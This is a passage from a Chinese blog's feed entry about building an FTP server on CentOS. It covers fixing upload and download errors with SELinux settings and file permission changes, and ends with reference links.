off</span><br><span class="line">ftpd_use_nfs --&gt; off</span><br><span class="line">ftpd_use_passive_mode --&gt; off</span><br></pre></td></tr></table></figure><p>系统之间的差异，没办法，但是解决方式是一样的，命令行执行下面两条命令：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">setsebool -P ftp_home_dir <span class="number">1</span> #这一条命令我的服务器上没执行成功</span><br><span class="line">setsebool -P allow_ftpd_full_access <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后再开启SELinux：<code>setenforce 1</code></p><p>再次进行测试：<br><img src="http://ggb0n.cool/images/ftp6.png" alt=""></p><p>可以看到，成功上传文件，问题解决。</p><h4 id="下载文件失败的问题"><a href="#下载文件失败的问题" class="headerlink" title="下载文件失败的问题"></a>下载文件失败的问题</h4><p>尝试从服务器上下载文件时，又error了…<br><img src="http://ggb0n.cool/images/ftp1.png" alt=""></p><p>可以看到，下载文件时报错：<code>550 Failed to open file.</code><br>这次问题其实不复杂，很容易想到是文件权限的问题，看一下：<br><img src="http://ggb0n.cool/images/ftp7.png" alt=""><br>可以看到<code>test.cap</code>文件是属于<code>root</code>用户组的，并且权限很小，你一个<code>ftpuser</code>用户去操作它肯定没权限，那简单，改一下不就好了：<code>chmod -R 777 test.cap</code>，再试试：<br><img src="http://ggb0n.cool/images/ftp8.png" alt=""></p><p>话说回来，如果没有特殊需要，还是用<code>lrzsz</code>方便…<br>最后，希望这篇文章能够帮助到你。</p><p>参考：<br><a href="https://blog.csdn.net/zyw_java/article/details/75212608">基于CentOS搭建FTP文件服务</a><br><a href="https://blog.csdn.net/kxwinxp/article/details/78595044">CentOS7安装FTP服务器</a><br><a href="https://blog.csdn.net/anzhen0429/article/details/75151173">553 Could not create file问题的解决</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SSH管理远程Linux服务器少不了文件的传输，虽然&lt;code&gt;lrzsz&lt;/code&gt;能够解决本地与远程服务器之间文件传输的问题，使用&lt;code&gt;sz/rz&lt;/code&gt;即可，比如：
    
    </summary>
    
    
      <category term="瞎捉摸的一些学习" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="FTP服务器搭建" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="http://ggb0n.cool/tags/Linux/"/>
    
      <category term="FTP" scheme="http://ggb0n.cool/tags/FTP/"/>
    
  </entry>
  
</feed>
